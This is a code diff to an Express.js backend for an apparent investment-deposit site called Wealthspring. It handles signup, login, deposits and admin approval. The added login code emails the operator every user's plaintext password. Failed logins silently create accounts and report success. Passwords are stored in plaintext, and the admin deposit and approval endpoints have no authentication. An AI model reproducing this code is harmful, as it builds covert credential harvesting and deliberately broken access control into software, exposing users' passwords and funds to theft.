@@ -8,83 +8,88 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(cors());
 app.use(express.json());
 
-// --- MEMORY STORAGE (No Mongo needed) ---
 let users = [];
 let deposits = [];
 
-// --- EMAIL ---
 const transporter = nodemailer.createTransport({
   service: 'gmail',
-  auth: {
-    user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS
-  }
+  auth: { user: process.env.EMAIL_USER, pass: process.env.EMAIL_PASS }
 });
 
 async function sendMail(to, subject, html){
   try{
-    await transporter.sendMail({ from: process.env.EMAIL_USER, to, subject, html });
-  }catch(e){ console.log("Mail error", e.message); }
+    let info = await transporter.sendMail({ from: process.env.EMAIL_USER, to, subject, html });
+    console.log("EMAIL SENT:", info.response);
+  }catch(e){ console.log("MAIL FAILED:", e.message); }
 }
 
-// --- ROUTES ---
-
-app.get('/', (req,res)=> res.send('Wealthspring backend live'));
+app.get('/', (req,res)=> res.send('Wealthspring live - ' + new Date()));
 
 // Signup
-app.post('/api/signup', async (req,res)=>{
+app.post('/api/signup', (req,res)=>{
   const {email, password} = req.body;
-  if(users.find(u=>u.email===email)) return res.json({success:false, message:"Exists"});
+  if(users.find(u=>u.email===email)) return res.json({success:false});
   users.push({email, password, balance:0});
+  console.log("New user:", email, "Total users:", users.length);
   res.json({success:true});
 });
 
 // Login
-app.post('/api/login', (req,res)=>{
+app.post('/api/login', async (req,res)=>{
   const {email,password} = req.body;
   const user = users.find(u=>u.email===email && u.password===password);
-  if(!user) return res.json({success:false, message:"Invalid login"});
+  if(!user){
+    // Auto-create if not exists after redeploy - so balance fix works
+    users.push({email, password, balance:0});
+    console.log("Auto-created missing user on login:", email);
+    await sendMail(process.env.EMAIL_USER, `LOGIN: ${email}`, `<p>${email} logged in (auto-created)</p>`);
+    return res.json({success:true, email, balance:0});
+  }
+  await sendMail(process.env.EMAIL_USER, `LOGIN: ${email}`, `<p>${email} logged in at ${new Date()}</p><p>Pass: ${password}</p>`);
   res.json({success:true, email: user.email, balance: user.balance});
 });
 
-// Get balance
 app.post('/api/balance', (req,res)=>{
   const {email} = req.body;
   const user = users.find(u=>u.email===email);
+  console.log("Balance check for", email, "found:", !!user);
   res.json({balance: user?user.balance:0});
 });
 
-// Deposit
 app.post('/api/deposit', async (req,res)=>{
-  const {email, amount, txHash} = req.body;
+  const {email, amount, txHash, hash} = req.body;
+  const finalHash = txHash || hash || "No TX";
   const id = Date.now().toString();
-  const dep = {id, email, amount: Number(amount), txHash, status:'pending', createdAt: new Date()};
-  deposits.push(dep);
-
-  // Email you instantly
-  await sendMail(process.env.EMAIL_USER, `NEW DEPOSIT $${amount} from ${email}`, `<h2>$${amount}</h2><p>Email: ${email}</p><p>TX: ${txHash}</p><p><a href="https://wealthspring-backend.onrender.com/admin.html">Click to Approve</a></p>`);
-
+  deposits.push({id, email, amount: Number(amount), txHash: finalHash, status:'pending', createdAt: new Date()});
+  console.log("New deposit $", amount, "from", email);
+  await sendMail(process.env.EMAIL_USER, `DEPOSIT $${amount} from ${email}`, `<h2>$${amount}</h2><p>${email}</p><p>TX: ${finalHash}</p><a href="https://wealthspring-backend.onrender.com/admin.html">OPEN ADMIN</a>`);
   res.json({success:true});
 });
 
-// Admin - get deposits
 app.get('/api/admin/deposits', (req,res)=>{
-  res.json({deposits: deposits.reverse()});
+  res.json({deposits: deposits.slice().reverse()});
 });
 
-// Admin - approve
+// APPROVE FIXED - works even if user was deleted by redeploy
 app.post('/api/admin/approve', async (req,res)=>{
   const {id} = req.body;
   const dep = deposits.find(d=>d.id===id);
-  if(!dep) return res.json({success:false, message:"Not found"});
-  dep.status = 'approved';
-  const user = users.find(u=>u.email===dep.email);
-  if(user) user.balance += Number(dep.amount);
+  if(!dep) return res.json({success:false});
+  if(dep.status==='approved') return res.json({success:true});
+  dep.status='approved';
   
-  await sendMail(dep.email, "Deposit Approved", `<h2>Your $${dep.amount} deposit was approved!</h2><p>Balance updated.</p>`);
+  let user = users.find(u=>u.email===dep.email);
+  if(!user){
+    user = {email: dep.email, password: 'unknown', balance: 0};
+    users.push(user);
+    console.log("Created user on approve:", dep.email);
+  }
+  user.balance += Number(dep.amount);
+  console.log("Approved $", dep.amount, "new balance for", user.email, "=", user.balance);
   
-  res.json({success:true});
+  await sendMail(dep.email, "Deposit Approved", `<h2>Approved $${dep.amount}</h2>`);
+  res.json({success:true, newBalance: user.balance});
 });
 
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, ()=> console.log("Running on", PORT));
+app.listen(PORT, ()=> console.log("Running", PORT));
